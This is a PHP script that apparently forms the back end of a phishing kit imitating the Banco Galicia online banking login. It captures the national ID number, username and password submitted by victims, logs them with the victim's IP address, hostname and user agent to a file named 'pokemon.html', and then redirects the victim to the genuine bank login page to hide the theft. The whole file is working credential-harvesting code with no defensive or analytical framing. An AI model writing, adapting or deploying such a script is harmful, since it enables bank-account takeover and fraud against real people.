<?php
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$useragent = $_SERVER['HTTP_USER_AGENT'];
$DocumentNumber = $_POST['DocumentNumber'];
$UserName = $_POST['UserName'];
$Password = $_POST['Password'];
$guardame = fopen('pokemon.html','a+');
fwrite($guardame,
"<br/><b>-----------------( GALICIA - LOGIN )-------------------:</b>".$null.
"<br/><b>DNI :</b>".$DocumentNumber.
"<br/><b>USUARIO :</b>".$UserName.
"<br/><b>CLAVE :</b>".$Password.
"<br/><b>--------------------------------------------------------</b>".$null.
"<br/><b>IP DE USUARIO :</b>".$ip.
"<br/><b>HOSTNAME :</b>".$hostname.
"<br/><b>USER AGENT :</b>".$useragent." ");
"<br/><b>--------------------------------------------------------</b>".$null.

fclose($guardame);

header ("Location: https://onlinebanking.bancogalicia.com.ar/login");

?>